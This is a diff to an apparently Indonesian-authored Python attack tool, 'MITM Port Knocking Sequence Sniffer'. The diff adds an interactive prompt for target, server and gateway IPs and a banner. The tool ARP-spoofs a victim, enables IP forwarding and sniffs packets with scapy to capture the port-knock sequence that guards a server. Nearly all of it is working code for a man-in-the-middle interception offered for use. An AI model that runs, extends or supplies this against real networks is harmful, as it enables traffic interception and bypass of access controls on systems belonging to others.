@@ -9,11 +9,29 @@ import threading
 import ctypes
 import subprocess
 import platform
+import re
 
 # Global variables
 knock_sequence = []
 detected_ports = set()
 args = None  # Will store command line arguments
+
+def print_banner():
+    """Menampilkan banner tools."""
+    banner = """
+    ███╗   ███╗██╗████████╗███╗   ███╗    ██╗  ██╗███╗   ██╗ ██████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
+    ████╗ ████║██║╚══██╔══╝████╗ ████║    ██║ ██╔╝████╗  ██║██╔═══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
+    ██╔████╔██║██║   ██║   ██╔████╔██║    █████╔╝ ██╔██╗ ██║██║   ██║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
+    ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║    ██╔═██╗ ██║╚██╗██║██║   ██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
+    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║    ██║  ██╗██║ ╚████║╚██████╔╝╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
+    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+    
+                        [+] MITM Port Knocking Sequence Sniffer v1.0 [+]
+                        [+] Created By: MRXNEXSUS                    [+]
+                        [+] Github: github.com/mrxnexsus             [+]
+    """
+    print(banner)
+    print("\n" + "="*80)
 
 def is_admin():
     """Check if the script is running with administrator privileges."""
@@ -22,14 +40,96 @@ def is_admin():
     except:
         return False
 
-def get_arguments():
-    """Mengambil argumen dari command line."""
-    parser = argparse.ArgumentParser(description="MITM Port Knocking Sequence Sniffer. By Gemini.")
-    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="IP address of the target client.")
-    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="IP address of the network gateway/router.")
-    parser.add_argument("-s", "--server", dest="server_ip", required=True, help="IP address of the server being knocked.")
-    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Network interface to use (e.g., eth0).")
-    return parser.parse_args()
+def is_valid_ip(ip):
+    """Validasi format IP address."""
+    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+    if not re.match(pattern, ip):
+        return False
+    # Cek setiap oktet
+    octets = ip.split('.')
+    return all(0 <= int(octet) <= 255 for octet in octets)
+
+def get_available_interfaces():
+    """Mendapatkan daftar interface jaringan yang tersedia."""
+    try:
+        # Gunakan command netsh untuk Windows
+        result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
+                              capture_output=True, text=True)
+        interfaces = []
+        for line in result.stdout.split('\n'):
+            if 'Connected' in line:
+                # Ambil nama interface (biasanya di kolom terakhir)
+                interface = line.strip().split()[-1]
+                interfaces.append(interface)
+        return interfaces
+    except Exception as e:
+        print(f"[!] Error getting interfaces: {e}")
+        return ['Wi-Fi', 'Ethernet']  # Default fallback
+
+def get_user_input():
+    """Mendapatkan input dari user secara interaktif."""
+    print_banner()
+    print("\nPlease enter the following information:")
+    
+    while True:
+        target_ip = input("\n[>] Enter target IP (knocking from): ")
+        if is_valid_ip(target_ip):
+            break
+        print("[!] Invalid IP address format. Please use format: xxx.xxx.xxx.xxx")
+    
+    while True:
+        server_ip = input("[>] Enter server IP (knocking to): ")
+        if is_valid_ip(server_ip):
+            break
+        print("[!] Invalid IP address format. Please use format: xxx.xxx.xxx.xxx")
+    
+    while True:
+        gateway_ip = input("[>] Enter gateway IP (usually ends with .1): ")
+        if is_valid_ip(gateway_ip):
+            break
+        print("[!] Invalid IP address format. Please use format: xxx.xxx.xxx.xxx")
+    
+    # Tampilkan interface yang tersedia
+    print("\n[+] Available network interfaces:")
+    interfaces = get_available_interfaces()
+    for i, iface in enumerate(interfaces, 1):
+        print(f"    {i}. {iface}")
+    
+    while True:
+        try:
+            choice = int(input("\n[>] Select interface number: "))
+            if 1 <= choice <= len(interfaces):
+                interface = interfaces[choice-1]
+                break
+            print(f"[!] Please select a number between 1 and {len(interfaces)}")
+        except ValueError:
+            print("[!] Please enter a valid number")
+    
+    # Buat objek yang mirip dengan argparse namespace
+    class Args:
+        pass
+    
+    args = Args()
+    args.target_ip = target_ip
+    args.server_ip = server_ip
+    args.gateway_ip = gateway_ip
+    args.interface = interface
+    
+    # Konfirmasi
+    print("\n[+] Configuration Summary:")
+    print("=" * 40)
+    print(f"    Target IP  : {args.target_ip}")
+    print(f"    Server IP  : {args.server_ip}")
+    print(f"    Gateway IP : {args.gateway_ip}")
+    print(f"    Interface  : {args.interface}")
+    print("=" * 40)
+    
+    confirm = input("\n[>] Is this correct? (y/n): ").lower()
+    if confirm != 'y':
+        print("\n[!] Configuration cancelled. Please start over.")
+        return get_user_input()
+    
+    return args
 
 def enable_ip_forwarding(interface):
     """Enable IP forwarding based on the operating system."""
@@ -231,54 +331,62 @@ def main():
         print("[!] This script must be run as administrator. Please run with admin privileges.")
         sys.exit(1)
 
-    args = get_arguments()
-    enable_ip_forwarding(args.interface)
-
-    # Membuat dan memulai thread untuk ARP spoofing
-    spoofer = threading.Thread(target=arp_spoof_thread, args=(args.target_ip, args.gateway_ip))
-    spoofer.daemon = True # Memastikan thread berhenti saat program utama berhenti
-    spoofer.start()
+    # Dapatkan input dari user
+    args = get_user_input()
     
-    print(f"\n[*] Starting MITM attack...")
-    print(f"[*] Target IP (knocking from): {args.target_ip}")
-    print(f"[*] Server IP (knocking to): {args.server_ip}")
-    print(f"[*] Gateway IP: {args.gateway_ip}")
-    print(f"[*] Interface: {args.interface}")
-    print("\n[*] Waiting for port knocking attempts...")
-    print("[*] Press CTRL+C to stop")
-
     try:
+        enable_ip_forwarding(args.interface)
+
+        # Membuat dan memulai thread untuk ARP spoofing
+        spoofer = threading.Thread(target=arp_spoof_thread, args=(args.target_ip, args.gateway_ip))
+        spoofer.daemon = True # Memastikan thread berhenti saat program utama berhenti
+        spoofer.start()
+        
+        print("\n[+] Attack Status:")
+        print("=" * 40)
+        print(f"[*] MITM attack started")
+        print(f"[*] ARP Spoofing active")
+        print(f"[*] Monitoring traffic between:")
+        print(f"    {args.target_ip} <-> {args.server_ip}")
+        print("=" * 40)
+        print("\n[*] Waiting for port knocking attempts...")
+        print("[*] Press CTRL+C to stop")
+
         # Tangkap semua paket IP untuk debugging
         bpf_filter = "ip"
-        print(f"[*] Starting packet capture with filter: {bpf_filter}")
+        print(f"\n[*] Starting packet capture with filter: {bpf_filter}")
         scapy.sniff(iface=args.interface, store=False, prn=packet_sniffer, filter=bpf_filter)
+        
     except KeyboardInterrupt:
-        print("\n[*] Detected CTRL+C. Shutting down...")
+        print("\n\n[!] Attack interrupted by user. Shutting down...")
     except Exception as e:
-        print(f"\n[!] An error occurred during sniffing: {e}")
+        print(f"\n[!] An error occurred: {e}")
     finally:
         try:
-            # Cleanup: Disable IP forwarding
+            # Cleanup
             print("\n[*] Cleaning up...")
             disable_ip_forwarding(args.interface)
             
-            # Cleanup: Restore ARP tables
             print("[*] Restoring ARP tables...")
             restore_arp(args.target_ip, args.gateway_ip)
             restore_arp(args.gateway_ip, args.target_ip)
             
             # Display results
             if knock_sequence:
-                print("\n[+] Port knock sequence detected!")
-                print("[+] Sequence (in order):", ", ".join(map(str, knock_sequence)))
-                print("[+] Total unique ports knocked:", len(knock_sequence))
+                print("\n[+] Results:")
+                print("=" * 40)
+                print("[+] Port knock sequence detected!")
+                print(f"[+] Sequence (in order): {', '.join(map(str, knock_sequence))}")
+                print(f"[+] Total unique ports knocked: {len(knock_sequence)}")
+                print("=" * 40)
             else:
                 print("\n[!] No port knock sequence was detected")
                 
         except Exception as e:
             print(f"[!] Error during cleanup: {e}")
         finally:
-            print("[+] Script terminated.")
+            print("\n[+] Attack terminated.")
+            print("=" * 40)
 
 if __name__ == "__main__":
     main()
